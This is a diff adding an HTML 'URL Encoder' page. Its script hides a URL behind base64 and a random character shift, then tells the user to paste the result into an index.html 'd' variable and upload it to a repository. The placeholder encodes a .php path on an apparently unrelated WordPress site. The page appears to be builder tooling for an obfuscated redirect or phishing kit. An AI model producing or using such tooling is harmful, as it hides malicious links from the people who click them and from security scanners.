@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>URL Encoder</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            max-width: 600px;
+            margin: 40px auto;
+            padding: 20px;
+            background: #f8f9fa;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 15px rgba(0,0,0,0.1);
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0 20px;
+            border: 1px solid #dee2e6;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        button {
+            background: #0d6efd;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background: #0b5ed7;
+        }
+        #result {
+            margin-top: 20px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 5px;
+            word-break: break-all;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>URL Encoder</h1>
+        <div>
+            <label for="url">Enter URL to encode:</label>
+            <input type="url" id="url" placeholder="aGFuZHltYW5zZXJ2aWNlc29mY2hpY2Fnby5jb20vd3AtYXJjaGl2ZS8wMzBjZi5waHA=" required>
+        </div>
+        <button onclick="encodeUrl()">Generate Encoded URL</button>
+        <div id="result" style="display: none;"></div>
+    </div>
+
+    <script>
+        function encode(str) {
+            const shift = Math.floor(Math.random() * 200) + 50;
+            let encoded = String.fromCharCode(shift);
+            for(let i = 0; i < str.length; i++) {
+                encoded += String.fromCharCode((str.charCodeAt(i) + shift) % 256);
+            }
+            return encoded;
+        }
+
+        function encodeUrl() {
+            const url = document.getElementById('url').value;
+            if (!url) {
+                alert('Please enter a URL');
+                return;
+            }
+
+            try {
+                const encoded = btoa(encode(btoa(url)));
+                const result = document.getElementById('result');
+                result.style.display = 'block';
+                result.innerHTML = `
+                    <h3>Encoded Data:</h3>
+                    <p>${encoded}</p>
+                    <h3>Instructions:</h3>
+                    <ol>
+                        <li>Copy the encoded data above</li>
+                        <li>Open index.html in a text editor</li>
+                        <li>Replace the value of 'd' variable with your copied data</li>
+                        <li>Upload index.html to your repository</li>
+                    </ol>
+                `;
+            } catch(e) {
+                alert('Encoding failed. Please try again.');
+            }
+        }
+    </script>
+</body>
+</html>
